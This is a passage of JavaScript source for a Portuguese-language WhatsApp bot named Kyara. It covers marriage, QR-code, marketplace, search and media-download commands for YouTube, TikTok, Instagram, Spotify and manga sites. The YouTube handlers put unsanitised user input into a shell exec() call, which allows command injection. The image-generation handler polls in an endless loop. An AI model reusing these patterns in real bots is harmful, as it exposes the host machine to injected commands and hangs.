familia[userId]?.namorandoCom !== alvo &&
familia[alvo]?.namorandoCom !== userId
) {
return reply('❌ Vocês precisam namorar antes de casar.');
}

familia[alvo] = familia[alvo] || {};

familia[alvo].pedidoCasamento = {
de: userId,
data: Date.now()
};

fs.writeFileSync(path, JSON.stringify(familia, null, 2));

return conn.sendMessage(from, {
text: `╭━━〔 💍 PEDIDO DE CASAMENTO 〕━━⬣
┃ ❤️ @${userId.split('@')[0]}
┃ pediu
┃ ❤️ @${alvo.split('@')[0]}
┃ em casamento!
┃
┃ Para aceitar:
┃ ${prefix}aceitarcasamento
╰━━━━━━━━━━━━━━⬣`,
mentions: [userId, alvo]
}, { quoted: selo });
}
break;

case 'qr':
case 'qrcode':
case 'qrgenerator': {
try {
const QRCode = require('qrcode');

let destino = q?.trim();

const quotedMsg = info?.message?.extendedTextMessage?.contextInfo?.quotedMessage;

const imgMsg =
quotedMsg?.imageMessage ||
quotedMsg?.viewOnceMessageV2?.message?.imageMessage ||
quotedMsg?.viewOnceMessage?.message?.imageMessage;

if (!destino && !imgMsg) {
return reply(`╭━━〔 📱 QR GENERATOR 〕━━⬣
┃ Gere QR Codes para:
┃
┃ 🌐 Sites
┃ 🖼️ Fotos
┃ 📱 WhatsApp
┃ 🎵 Música
┃ 📹 Vídeos
┃
┃ Exemplos:
┃ ${prefix}qr https://google.com
┃
┃ Ou responda uma foto:
┃ ${prefix}qr
╰━━━━━━━━━━━━━━⬣`);
}

if (imgMsg) {
await reply('📤 Enviando imagem...');

const buffer = await getFileBuffer(imgMsg, 'image');

const link = await uploadTelegraph(
buffer,
'imagem.jpg',
'image/jpeg'
);

if (!link) return reply('❌ Falha ao enviar imagem.');

destino = link;
}

await reply('⏳ Gerando QR Code...');

const qrBuffer = await QRCode.toBuffer(destino, {
type: 'png',
width: 1200,
margin: 2,
color: {
dark: '#000000',
light: '#FFFFFF'
}
});

await conn.sendMessage(from, {
image: qrBuffer,
caption: `╭━━〔 📱 QR CODE GERADO 〕━━⬣
┃ 🔗 Destino:
┃ ${destino.length > 100 ? destino.slice(0, 100) + '...' : destino}
┃
┃ 📲 Escaneie o QR para abrir.
╰━━━━━━━━━━━━━━⬣`
}, {
quoted: info
});

} catch (e) {
console.error('[QR ERROR]', e);
reply('❌ Erro ao gerar QR Code.');
}
}
break;

case 'market':
case 'marketplace':
case 'lojamembros': {
try {
const marketPath = './database/marketplace.json';

if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
if (!fs.existsSync(marketPath)) fs.writeFileSync(marketPath, '{}');

let market = JSON.parse(fs.readFileSync(marketPath));
const sub = args[0]?.toLowerCase();
const userId = jidNormalizedUser(sender);

if (!sub) {
return reply(`╭━━〔 🏪 MARKETPLACE KYARA 〕━━⬣
┃ ${prefix}market vender item preço quantidade
┃ ${prefix}market listar
┃ ${prefix}market comprar id
┃ ${prefix}market remover id
┃ ${prefix}market meus
┃
┃ Ex:
┃ ${prefix}market vender pcgamer 50000 1
┃ ${prefix}market comprar 1
╰━━━━━━━━━━━━━━⬣`);
}

if (sub === 'vender') {
const item = args[1]?.toLowerCase();
const preco = Number(args[2]);
const qtd = Number(args[3]) || 1;

if (!item || !preco || preco <= 0 || qtd <= 0) {
return reply(`Use:\n${prefix}market vender item preço quantidade`);
}

const banco = carregarBanco();

if (!banco[userId]) return reply('❌ Você não possui conta no banco.');

if (!banco[userId].inventario) banco[userId].inventario = {};

const inv = banco[userId].inventario;

const itemData = inv[item];

const quantidadeAtual =
typeof itemData === 'object'
? Number(itemData.quantidade || 0)
: Number(itemData || 0);

if (!itemData || quantidadeAtual < qtd) {
return reply(`❌ Você não tem ${qtd}x ${item} no inventário.`);
}

if (typeof itemData === 'object') {
itemData.quantidade -= qtd;

if (itemData.quantidade <= 0) {
delete inv[item];
}
} else {
inv[item] -= qtd;

if (inv[item] <= 0) {
delete inv[item];
}
}

const id = Date.now().toString();

market[id] = {
id,
vendedor: userId,
item,
preco,
qtd,
grupo: from,
data: Date.now()
};

fs.writeFileSync(marketPath, JSON.stringify(market, null, 2));
salvarBanco(banco);

return reply(`╭━━〔 ✅ ITEM ANUNCIADO 〕━━⬣
┃ 🆔 ID: ${id}
┃ 📦 Item: ${item}
┃ 🔢 Quantidade: ${qtd}
┃ 💰 Preço: R$${preco}
╰━━━━━━━━━━━━━━⬣`);
}

if (sub === 'listar') {
const anuncios = Object.values(market).filter(a => a.grupo === from);

if (!anuncios.length) return reply('❌ Nenhum item anunciado nesse grupo.');

let txt = `╭━━〔 🏪 MARKETPLACE 〕━━⬣\n`;

for (const a of anuncios.slice(0, 20)) {
txt += `┃ 🆔 ID: ${a.id}\n`;
txt += `┃ 👤 Vendedor: @${a.vendedor.split('@')[0]}\n`;
txt += `┃ 📦 Item: ${a.item}\n`;
txt += `┃ 🔢 Qtd: ${a.qtd}\n`;
txt += `┃ 💰 Preço: R$${a.preco}\n`;
txt += `┃ Comprar: ${prefix}market comprar ${a.id}\n`;
txt += `┣━━━━━━━━━━━━━━⬣\n`;
}

txt += `╰━━━━━━━━━━━━━━⬣`;

return conn.sendMessage(from, {
text: txt,
mentions: anuncios.map(a => a.vendedor)
}, { quoted: selo });
}

if (sub === 'meus') {
const meus = Object.values(market).filter(a => a.vendedor === userId);

if (!meus.length) return reply('❌ Você não tem anúncios.');

let txt = `╭━━〔 📦 MEUS ANÚNCIOS 〕━━⬣\n`;

for (const a of meus) {
txt += `┃ 🆔 ID: ${a.id}\n`;
txt += `┃ 📦 Item: ${a.item}\n`;
txt += `┃ 🔢 Qtd: ${a.qtd}\n`;
txt += `┃ 💰 Preço: R$${a.preco}\n`;
txt += `┃ Remover: ${prefix}market remover ${a.id}\n`;
txt += `┣━━━━━━━━━━━━━━⬣\n`;
}

txt += `╰━━━━━━━━━━━━━━⬣`;

return reply(txt);
}

if (sub === 'remover') {
const id = args[1];
const anuncio = market[id];

if (!anuncio) return reply('❌ Anúncio não encontrado.');
if (anuncio.vendedor !== userId && !So_Dono) return reply('❌ Só o vendedor pode remover.');

const banco = carregarBanco();

if (!banco[anuncio.vendedor]) {
banco[anuncio.vendedor] = {
saldo: 0,
xp: 0,
inventario: {}
};
}

if (!banco[anuncio.vendedor].inventario) banco[anuncio.vendedor].inventario = {};

banco[anuncio.vendedor].inventario[anuncio.item] =
Number(banco[anuncio.vendedor].inventario[anuncio.item] || 0) + Number(anuncio.qtd || 1);

delete market[id];

fs.writeFileSync(marketPath, JSON.stringify(market, null, 2));
salvarBanco(banco);

return reply('✅ Anúncio removido e item voltou para o inventário.');
}

if (sub === 'comprar') {
const id = args[1];
const anuncio = market[id];

if (!anuncio) return reply('❌ Anúncio não encontrado.');
if (anuncio.vendedor === userId) return reply('❌ Você não pode comprar seu próprio item.');

const banco = carregarBanco();

if (!banco[userId]) return reply('❌ Você não possui conta no banco.');

if (!banco[anuncio.vendedor]) {
banco[anuncio.vendedor] = {
saldo: 0,
xp: 0,
inventario: {}
};
}

let contaComprador = banco[userId];
let contaVendedor = banco[anuncio.vendedor];

let preco = Number(anuncio.preco || 0);
let qtd = Number(anuncio.qtd || 1);
let saldoComprador = Number(contaComprador.saldo || 0);

if (saldoComprador < preco) {
return reply(`❌ Você não tem saldo suficiente.

💰 Seu saldo: R$${saldoComprador}
🏷️ Preço: R$${preco}`);
}

contaComprador.saldo = saldoComprador - preco;
contaVendedor.saldo = Number(contaVendedor.saldo || 0) + preco;

if (!contaComprador.inventario) contaComprador.inventario = {};

if (!contaComprador.inventario[anuncio.item]) {
  contaComprador.inventario[anuncio.item] = {
    qtd: 0,
    valor: anuncio.preco
  };
}

contaComprador.inventario[anuncio.item].qtd =
Number(contaComprador.inventario[anuncio.item].qtd || 0) + qtd;

contaComprador.inventario[anuncio.item].valor = anuncio.preco;

delete market[id];

fs.writeFileSync(marketPath, JSON.stringify(market, null, 2));
salvarBanco(banco);

return conn.sendMessage(from, {
text: `╭━━〔 ✅ COMPRA REALIZADA 〕━━⬣
┃ 👤 Comprador: @${userId.split('@')[0]}
┃ 🏪 Vendedor: @${anuncio.vendedor.split('@')[0]}
┃ 📦 Item: ${anuncio.item}
┃ 🔢 Quantidade: ${qtd}
┃ 💰 Valor: R$${preco}
╰━━━━━━━━━━━━━━⬣`,
mentions: [userId, anuncio.vendedor]
}, { quoted: selo });
}

return reply('❌ Opção inválida.');

} catch (e) {
console.log('[MARKET ERROR]', e);
reply('❌ Erro no marketplace.');
}
}
break;

case 'google':
case 'pesquisar': {
try {
if (!q) return reply(`Exemplo:\n${prefix}google Felipe Neto`);

await reagir(from, "🔎");

const cheerio = require("cheerio");

const url = `https://news.google.com/rss/search?q=${encodeURIComponent(q)}&hl=pt-BR&gl=BR&ceid=BR:pt-419`;

const { data } = await axios.get(url, {
timeout: 15000,
headers: { "User-Agent": "Mozilla/5.0" }
});

const $ = cheerio.load(data, { xmlMode: true });
let resultados = [];

$("item").each((i, el) => {
if (resultados.length >= 5) return false;

const titulo = $(el).find("title").text().trim();
const link = $(el).find("link").text().trim();
const desc = $(el).find("description").text().replace(/<[^>]*>/g, "").trim();

if (!titulo || !link) return;

resultados.push({ titulo, desc, link });
});

if (!resultados.length) {
console.log("[GOOGLE RSS VAZIO]", data.slice(0, 500));
return reply("❌ Nenhum resultado encontrado.");
}

global.googleSearch = global.googleSearch || {};
global.googleSearch[from] = resultados;

let texto = `╭━━〔 🔎 KYARA SEARCH ⚡ 〕━━╮
┃
┃ 🔍 Pesquisa: ${q}
┃ 📦 Resultados: ${resultados.length}
┃
╠════════════════════
┃ 🔗 ${prefix}gopen 1
┃ 📋 ${prefix}gcopy 1
┃ 📚 ${prefix}glista
╚════════════════════

◇ Clique em ☰ Selecionar para escolher um resultado ◇`;

const rows = resultados.map((r, i) => ({
title: r.titulo.slice(0, 45),
description: r.desc ? r.desc.slice(0, 80) : r.link,
id: `${prefix}gopen ${i + 1}`
}));

await conn.sendMessage(from, {
text: texto,
footer: "© Kyara",
interactiveButtons: [
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "🔗 Abrir 1º Resultado",
id: `${prefix}gopen 1`
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "📋 Copiar Link",
id: `${prefix}gcopy 1`
})
},
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "📚 Ver Todos",
id: `${prefix}glista`
})
},
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Selecionar",
sections: [
{
title: "🔎 Resultados",
rows: resultados.map((r, i) => ({
title: r.titulo.slice(0, 45),
description: r.desc ? r.desc.slice(0, 80) : r.link,
id: `${prefix}gopen ${i + 1}`
}))
}
]
})
}
]
}, { quoted: selo });

await reagir(from, "✅");

} catch (e) {
console.log("[GOOGLE ERROR]", e.response?.data || e.message);
reply("❌ Erro ao pesquisar.");
}
}
break;

case 'gopen': {
try {
const num = Number(args[0]);
if (!num) return reply(`Use: ${prefix}gopen 1`);

const resultados = global.googleSearch?.[from];
if (!resultados || !resultados.length) {
return reply(`❌ Nenhuma pesquisa salva.\nUse ${prefix}google algo primeiro.`);
}

const r = resultados[num - 1];
if (!r) return reply("❌ Resultado inválido.");

reply(`╭━━〔 🔗 RESULTADO ${num} 〕━━╮
┃
┃ 📌 *${r.titulo}*
┃
┃ 🌐 ${r.link}
┃
╚════════════════════`);
} catch (e) {
console.log("[GOPEN ERROR]", e);
reply("❌ Erro ao abrir resultado.");
}
}
break;

case 'gcopy': {
try {
const num = Number(args[0]);
if (!num) return reply(`Use: ${prefix}gcopy 1`);

const resultados = global.googleSearch?.[from];
if (!resultados || !resultados.length) {
return reply(`❌ Nenhuma pesquisa salva.\nUse ${prefix}google algo primeiro.`);
}

const r = resultados[num - 1];
if (!r) return reply("❌ Resultado inválido.");

reply(r.link);
} catch (e) {
console.log("[GCOPY ERROR]", e);
reply("❌ Erro ao copiar link.");
}
}
break;

case 'glista':
case 'glist':
case 'googlelista': {
try {
const resultados = global.googleSearch?.[from];
if (!resultados || !resultados.length) {
return reply(`❌ Nenhuma pesquisa salva.\nUse ${prefix}google algo primeiro.`);
}

let txt = `╭━━〔 📚 TODOS RESULTADOS 〕━━╮\n┃\n`;

resultados.forEach((r, i) => {
txt += `┃ ${i + 1}. ${r.titulo}\n┃ 🔗 ${r.link}\n┃\n`;
});

txt += `╚════════════════════`;

reply(txt);
} catch (e) {
console.log("[GLISTA ERROR]", e);
reply("❌ Erro ao listar resultados.");
}
}
break;

case 'pinterest':
case 'pin': {
try {
if (!q) return reply(`📌 Use: ${prefix + command} anime dark`);

await reagir(from, "📌");

const query = encodeURIComponent(q);
const url = `https://www.pinterest.com/search/pins/?q=${query}`;

const { data } = await axios.get(url, {
headers: {
'User-Agent': 'Mozilla/5.0'
}
});

const imagens = [...data.matchAll(/"url":"(https:\/\/i\.pinimg\.com\/[^"]+)"/g)]
.map(v => v[1].replace(/\\u002F/g, '/'))
.filter(v => v.includes('i.pinimg.com'));

const semDuplicadas = [...new Set(imagens)];

if (!semDuplicadas.length) {
return reply('❌ Não achei imagens no Pinterest.');
}

const img = semDuplicadas[Math.floor(Math.random() * semDuplicadas.length)];

await conn.sendMessage(from, {
image: { url: img },
caption: `╭━━〔 📌 PINTEREST 〕━━⬣
┃ 🔎 Busca: ${q}
┃ 🖼️ Resultado encontrado
╰━━━━━━━━━━━━━━⬣`
}, { quoted: selo });

} catch (e) {
console.log('[PINTEREST ERROR]', e);
reply('❌ Erro ao buscar no Pinterest.');
}
}
break;

case 'tiktok':
case 'tiktokdl':
case 'ttkdl': {
try {
if (!q) return reply(`🎬 Use: ${prefix + command} link do TikTok`);

if (!q.includes('tiktok.com')) {
return reply('❌ Envie um link válido do TikTok.');
}

await reagir(from, "🎬");

const api = `https://tikwm.com/api/?url=${encodeURIComponent(q)}`;
const { data } = await axios.get(api);

const res = data?.data;

if (!res || !res.play) {
return reply('❌ Não consegui baixar esse TikTok.');
}

const legenda = `╭━━〔 🎬 TIKTOK DOWNLOAD 〕━━⬣
┃ 👤 Autor: ${res.author?.nickname || 'Desconhecido'}
┃ 📝 Título: ${res.title || 'Sem título'}
┃ ❤️ Likes: ${res.digg_count || 0}
┃ 💬 Comentários: ${res.comment_count || 0}
┃ 🔁 Compartilhamentos: ${res.share_count || 0}
╰━━━━━━━━━━━━━━⬣`;

await conn.sendMessage(from, {
video: { url: res.play },
caption: legenda
}, { quoted: selo });

} catch (e) {
console.log('[TIKTOKDL ERROR]', e);
reply('❌ Erro ao baixar TikTok.');
}
}
break;

case 'ytmp3':
case 'playyt':
case 'playaudio': {
try {
if (!q) return reply(`🎧 Use: ${prefix + command} nome ou link`);

await reagir(from, "🎧");

const yts = require('yt-search');

let video;

if (q.includes('youtube.com') || q.includes('youtu.be')) {
video = { url: q, title: 'YouTube Audio' };
} else {
const search = await yts(q);
video = search.videos[0];
}

if (!video) return reply('❌ Não achei esse vídeo.');

const file = `./tmp/audio_${Date.now()}.mp3`;

if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp');

exec(`yt-dlp --extractor-args "youtube:player_client=mweb" -x --audio-format mp3 -o "${file}" "${video.url}"`, async (err) => {
if (err) {
console.log('[YTMP3 ERROR]', err);
return reply('❌ Erro ao baixar áudio.');
}

const audioBuffer = fs.readFileSync(file);

await conn.sendMessage(from, {
text: `🎧 *KYARA PLAY*

🎵 *Título:* ${video.title}
🔗 *Link:* ${video.url}

> selecione uma opção`,

audioFooter: audioBuffer,

nativeFlow: [
{
text: '🎬 Baixar Vídeo',
id: `${prefix}ytmp4 ${video.url}`
},
{
text: '🔁 Tocar Novamente',
id: `${prefix}play ${video.title}`
},
{
text: '📋 Menu',
id: `${prefix}menu`
}
]
}, { quoted: selo });

fs.unlinkSync(file);
});

} catch (e) {
console.log('[PLAY ERROR]', e);
reply('❌ Erro no play.');
}
}
break;

case 'ytmp4':
case 'playvideo':
case 'video': {
try {
if (!q) return reply(`🎬 Use: ${prefix + command} nome ou link`);

await reagir(from, "🎬");

const yts = require('yt-search');

let video;

if (q.includes('youtube.com') || q.includes('youtu.be')) {
video = { url: q, title: 'YouTube Video' };
} else {
const search = await yts(q);
video = search.videos[0];
}

if (!video) return reply('❌ Não achei esse vídeo.');

const file = `./tmp/video_${Date.now()}.mp4`;

if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp');

exec(`yt-dlp -f "mp4[height<=480]+bestaudio/best[height<=480]" -o "${file}" "${video.url}"`, async (err) => {
if (err) {
console.log('[YTMP4 ERROR]', err);
return reply('❌ Erro ao baixar vídeo.');
}

await conn.sendMessage(from, {
video: fs.readFileSync(file),
caption: `🎬 ${video.title}`
}, { quoted: selo });

fs.unlinkSync(file);
});

} catch (e) {
console.log('[VIDEO ERROR]', e);
reply('❌ Erro no vídeo.');
}
}
break;

case 'ig':
case 'instagram': {
try {

if (!q) {
return reply(`📥 *Exemplo:*\n${prefix + command} https://www.instagram.com/reel/...`);
}

await reagir(from, "⏳");

const axios = require("axios");

const { data } = await axios.get(
`https://zone.api.br/api/V2/instagram?apikey=freekey&url=${encodeURIComponent(q)}`
);

if (!data?.status || !data?.media?.length) {
await reagir(from, "❌");
return reply("❌ Não consegui obter essa publicação.");
}

const legenda = data.caption || "Sem legenda.";
const autor = data.author?.name || "Desconhecido";
const seguidores = data.author?.followers || "0";
const likes = data.stats?.likes || "0";

await conn.sendRich(from, [

conn.makeText(
`# 📸 INSTAGRAM

👤 **Autor:** ${autor}

❤️ **Curtidas:** ${likes}

👥 **Seguidores:** ${seguidores}

## 📝 Legenda

${legenda}`
)

], info);

for (const media of data.media) {

const isVideo =
media.endsWith(".mp4") ||
media.includes("/video") ||
data.type === "video";

if (isVideo) {
await conn.sendMessage(from, {
video: { url: media },
caption: "📹 Mídia do Instagram"
}, { quoted: info });

} else {

await conn.sendMessage(from, {
image: { url: media },
caption: "🖼️ Mídia do Instagram"
}, { quoted: info });

}

}

await reagir(from, "✅");

} catch (e) {

console.log(e);

await reagir(from, "❌");

reply("❌ Erro ao baixar essa publicação.");

}
}
break;

case 'spotify':
case 'spotsearch': {
try {

if (!q) {
return reply(`🎵 *Exemplo:*\n${prefix + command} Amor Hospitalar`);
}

await reagir(from, "🔍");

const { data } = await axios.get(
`https://zone.api.br/api/search/spotify?q=${encodeURIComponent(q)}&limit=10`
);

if (!data?.status || !data?.result?.length) {
await reagir(from, "❌");
return reply("❌ Nenhuma música encontrada.");
}

const lista = data.result;

global.spotifyCache ??= {};
global.spotifyCache[from] = lista;

const tabela = [
["Nº", "Título"]
];

lista.forEach((m, i) => {
tabela.push([
String(i + 1),
m.title
]);
});

await conn.sendRich(from, [

conn.makeText(
`# 🎵 Spotify

🔎 Pesquisa: **${q}**

Foram encontrados **${lista.length}** resultados.

Digite:

\`${prefix}spotify2 número\`

Exemplo:

\`${prefix}spotify2 1\``
),

conn.makeTable(tabela),

conn.makeText(
lista.map((m, i) =>
`**${i + 1}.** ${m.title}
👤 ${m.artists}
⏱ ${m.duration}`
).join("\n\n")
)

], info, [
"RICH_RESPONSE_TABLE"
]);

await reagir(from, "✅");

} catch (e) {
console.log(e);
await reagir(from, "❌");
reply("❌ Erro ao pesquisar músicas.");
}
}
break;

case 'spotify2': {
try {

if (!q) {
return reply(`🎵 Exemplo:\n${prefix}spotify2 1`);
}

const cache = global.spotifyCache?.[from];

if (!cache) {
return reply("❌ Faça uma pesquisa primeiro usando o comando spotify.");
}

const index = Number(q) - 1;

if (isNaN(index) || !cache[index]) {
return reply("❌ Número inválido.");
}

await reagir(from, "⏳");

const musica = cache[index];

const { data } = await axios.get(
`https://zone.api.br/api/spotify?url=${encodeURIComponent(musica.url)}`
);

if (!data?.status) {
throw new Error("Falha ao baixar");
}

await conn.sendRich(from, [

conn.makeText(
`# 🎶 Baixando Música

**${data.title}**

👤 ${musica.artists}
⏱ ${musica.duration}

Aguarde alguns segundos...`
)

], info);

await conn.sendMessage(from, {
audio: {
url: data.download_url.replace(/^http:\/\//, "https://")
},
mimetype: "audio/mpeg",
fileName: `${data.title}.mp3`
}, {
quoted: info
});

await reagir(from, "✅");

} catch (e) {
console.log(e);
await reagir(from, "❌");
reply("❌ Erro ao baixar a música.");
}
}
break;

case 'help':
case 'helpp':
case 'ajuda': {
  try {

    let texto = `
🤖 *Kyara MENU*

📌 *Comandos básicos:*
$menu - ver menu
$ping - testar bot
$info - informações
$owner - dono do bot

🎨 *Imagens:*
$flux - gerar imagem
$anime - imagem anime
$nano - edita imagens

🧠 *IA:*
Kyara - perguntar algo
Veyron - conversar com IA
$coder - traduzir texto

👥 *Grupos:*
$tagall - marcar todos
$hidetag - mensagem oculta
$kick - remover usuário
$promote - promover

🛠️ *Admin:*
$ban - banir usuário
$unban - remover ban
$block - bloquear
$unblock - desbloquear

⚡ *Extras:*
$calc - calculadora
$clima - clima da cidade
$ping - velocidade

📌 *Bot em desenvolvimento...*
`;

    await conn.sendMessage(from, {
      text: texto.trim(),
      footer: "⚡ Kyara | Sistema ativo",
      buttons: [
        { buttonId: 'flux', buttonText: { displayText: '🖼️ Imagem' }, type: 1 },
        { buttonId: 'Kyara', buttonText: { displayText: '🤖 IA' }, type: 1 },
        { buttonId: 'menu', buttonText: { displayText: '📜 Menu' }, type: 1 }
      ],
      headerType: 1
    }, { quoted: info });

  } catch (e) {
    console.log(e);
    reply('❌ Erro ao abrir menu.');
  }
}
break;

case 'kyaraimagine':
case 'kyaraai': {
try {

if (!q) return reply(`🖼️ *KYARA IMAGINE AI*

Use:
${prefix + command} texto

Exemplo:
${prefix + command} um carro futurista na lua`);

const axios = require("axios");

await reagir(from, "🎨");

reply("⏳ Gerando suas imagens com Kyara-AI...");

const { data: gerar } = await axios.post(
"https://zone.api.br/api/v1/grokimagine?apikey=API_KEY_SYSTEM",
{
prompt: q
}
);

if (!gerar.status) {
return reply("❌ Erro ao iniciar geração.");
}

const job = gerar.job_id;

reply(`⏳ Imagens na fila...

Aguarde alguns segundos...`);

let resultado;
let tentativas = 0;

while (true) {

await new Promise(resolve => setTimeout(resolve, 5000));

const { data } = await axios.get(
`https://zone.api.br/api/v1/grokimagine/status`,
{
params: {
job_id: job
}
}
);

resultado = data;

if (data.estado === "done") break;

tentativas++;
}

if (!resultado || resultado.estado !== "done") {
return reply("❌ Tempo esgotado para gerar as imagens.");
}

reply(`✅ Pronto!

Enviando resultado...`);

const img = resultado.result_urls[0];

await conn.sendMessage(from, {
image: {
url: img
},
caption: `🎨 *Kyara Imagine AI*`
});

} catch (e) {
console.log(e);
reply("❌ Erro ao gerar imagem.");
}
}
break;

case 'manga':
case 'mangá': {
try {

const PDFDocument = require("pdfkit");
const {
generateWAMessageFromContent,
prepareWAMessageMedia,
proto
} = require("@systemzero/baileys");

global.mangaCache = global.mangaCache || new Map();

if (!q?.trim()) {
return reply(`
📚 Como usar:

${prefix + command} <nome do mangá>
${prefix + command} <url do mangá>

📌 Exemplo:
${prefix + command} gachiakuta
`);
}

await reagir(from, "🔍");

function gerarThumbnailPadrao(titulo) {
const svg = `
<svg xmlns="http://www.w3.org/2000/svg" width="300" height="400">
  <rect width="300" height="400" fill="#111827"/>
  <text x="150" y="180" font-size="55" text-anchor="middle">📚</text>
  <text x="150" y="240" font-size="22" fill="#fff" text-anchor="middle">
    ${titulo || "Mangá"}
  </text>
</svg>
`;
return Buffer.from(svg);
}

async function buscarTodosCapitulos(manga) {
let slug = manga;

if (manga.startsWith("http")) {
const u = new URL(manga);
const partes = u.pathname.split("/").filter(Boolean);
slug = partes.pop();
} else {
slug = manga.trim().toLowerCase().replace(/\s+/g, "-");
}

const url = `https://mangalivre.blog/manga/${slug}/`;

const { data } = await axios.get(url, {
headers: { "User-Agent": "Mozilla/5.0" },
timeout: 20000
});

const $ = cheerio.load(data);

let titulo =
$("h1").first().text().trim() ||
$(".manga-title").text().trim() ||
$(".entry-title").text().trim() ||
slug.replace(/-/g, " ");

let thumb = null;

$("img").each((_, el) => {
const src = $(el).attr("src") || $(el).attr("data-src");
if (src && src.includes("/wp-content/uploads/") && !src.includes("logo")) {
thumb = src;
return false;
}
});

let capitulos = [];

$(".chapter-grid-link").each((i, el) => {
const numero =
$(el).find(".chapter-grid-number span").text().trim() ||
`Capítulo ${i + 1}`;

const nome =
$(el).find(".chapter-grid-title").text().trim() ||
numero;

const urlCap = $(el).attr("href");

if (urlCap) {
capitulos.push({
numero,
nome,
url: urlCap
});
}
});

if (!capitulos.length) throw new Error("Nenhum capítulo encontrado.");

capitulos.reverse();

return { titulo, thumb, capitulos };
}

async function baixarThumb(url, titulo) {
if (!url) return gerarThumbnailPadrao(titulo);

try {
const res = await axios.get(url, {
responseType: "arraybuffer",
timeout: 15000,
headers: {
"User-Agent": "Mozilla/5.0",
"Referer": "https://mangalivre.blog/"
}
});

return Buffer.from(res.data);
} catch {
return gerarThumbnailPadrao(titulo);
}
}

const resultado = await buscarTodosCapitulos(q.trim());

const tempDir = path.join(__dirname, "temp");
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

const thumbBuffer = await baixarThumb(resultado.thumb, resultado.titulo);
const thumbPath = path.join(tempDir, `manga_${Date.now()}.jpg`);
fs.writeFileSync(thumbPath, thumbBuffer);

const media = await prepareWAMessageMedia(
{ image: { url: thumbPath } },
{ upload: conn.waUploadToServer }
);

try { fs.unlinkSync(thumbPath); } catch {}

let sections = [];
const porGrupo = 2;

for (let i = 0; i < resultado.capitulos.length; i += porGrupo) {
const grupo = resultado.capitulos.slice(i, i + porGrupo);

const id = `manga_${Date.now()}_${i}`;

global.mangaCache.set(id, {
manga: resultado.titulo,
capitulos: grupo
});

setTimeout(() => global.mangaCache.delete(id), 10 * 60 * 1000);

sections.push({
title: `📚 Capítulos ${i + 1} até ${i + grupo.length}`,
rows: [{
title: `📖 Capítulo ${i + 1}${grupo.length > 1 ? ` até ${i + grupo.length}` : ""}`,
description: `${grupo.length} capítulo(s)`,
id
}]
});
}

const texto = `
╭━━━〔 📚 𝐌𝐀𝐍𝐆Á 〕━━━╮
┃ 📖 Nome: ${resultado.titulo}
┃ 📚 Total: ${resultado.capitulos.length} capítulos
╰━━━━━━━━━━━━━━━━╯

💡 Selecione abaixo o capítulo que deseja baixar em PDF.
`.trim();

const card = {
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
imageMessage: media.imageMessage
}),
body: proto.Message.InteractiveMessage.Body.fromObject({ text: texto }),
footer: proto.Message.InteractiveMessage.Footer.fromObject({
text: "Kyara • Leitor de Mangás"
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "📖 SELECIONAR CAPÍTULO",
sections
})
}]
})
};

const msg = generateWAMessageFromContent(from, {
interactiveMessage: {
carouselMessage: {
cards: [card]
}
}
}, { quoted: info });

await conn.relayMessage(from, msg.message, { messageId: msg.key.id });

await reagir(from, "✅");

} catch (e) {
console.log("[MANGA ERRO]", e);
await reagir(from, "❌");
reply(`❌ Erro ao buscar mangá:\n${e.message}`);
}

break;
}

case 'mediefire':
case 'mediafire': {
try {
if (!q) return reply(`📦 Use: ${prefix + command} nome do arquivo`);

await reagir(from, "🔎");

const cheerio = require("cheerio");

const pesquisa = `site:mediafire.com ${q}`;
const url = `https://lite.duckduckgo.com/lite/?q=${encodeURIComponent(pesquisa)}`;

const { data } = await axios.get(url, {
timeout: 15000,
headers: {
"User-Agent": "Mozilla/5.0",
"Accept": "text/html"
}
});

const $ = cheerio.load(data);
let resultados = [];

$("a.result-link").each((i, el) => {
if (resultados.length >= 10) return false;

let titulo = $(el).text().trim();
let link = $(el).attr("href");

if (!titulo || !link) return;

if (link.includes("uddg=")) {
try {
link = decodeURIComponent(link.split("uddg=")[1].split("&")[0]);
} catch {}
}

if (!link.includes("mediafire.com")) return;

resultados.push({ titulo, link });
});

if (!resultados.length) return reply("❌ Nenhum resultado encontrado.");

let texto = `╭━━〔 📦 MEDIAFIRE SEARCH 〕━━⬣\n\n`;

resultados.forEach((v, i) => {
texto += `┃ ${i + 1}. ${v.titulo}\n`;
texto += `┃ 🔗 ${v.link}\n\n`;
});

texto += `╰━━━━━━━━━━━━━━⬣`;

reply(texto);

await reagir(from, "✅");

} catch (e) {
console.log("[MFSEARCH ERROR]", e?.response?.status || e);
reply("❌ Erro ao pesquisar.");
}
}
break;

//Figurinhas 

case 'pack': {
try {

    const pesquisa = q || text || args.join(' ');

    if (!pesquisa) {
        return reply(`❌ Use assim:\n${prefix}pack gatos`);
    }

    await conn.sendMessage(from, {
        react: { text: '🔎', key: info.key }
    });

    const { data } = await axios.post(
        'https://zone.api.br/api/v1/stickerly/search',
        { q: pesquisa },
        { timeout: 20000 }
    );

    if (!data?.status || !data?.resultados?.length) {
        return reply(`❌ Nenhum pack encontrado para: *${pesquisa}*`);
    }

    const firstPack = data.resultados[0];

    reply(`📦 Pack encontrado: *${firstPack.name}*\n\n⏳ Baixando e enviando até *30 figurinhas*...`);

    const { data: dlData } = await axios.post(
        'https://zone.api.br/api/v1/stickerly/download',
        { url: firstPack.shareUrl },
        { timeout: 30000 }
    );

    if (!dlData?.status || !dlData?.resultado?.stickers?.length) {
        return reply('❌ Falha ao baixar os dados do pacote.');
    }

    const pack = dlData.resultado;
    const stickers = pack.stickers.slice(0, 30);

    await conn.sendMessage(from, {
        react: { text: '🚀', key: info.key }
    });

    let enviados = 0;

    for (let i = 0; i < stickers.length; i++) {
        try {
            const url = stickers[i].url;
            if (!url) continue;

            const res = await axios.get(url, {
                responseType: 'arraybuffer',
                timeout: 20000,
                headers: { 'User-Agent': 'Mozilla/5.0' }
            });

            let buffer = Buffer.from(res.data);

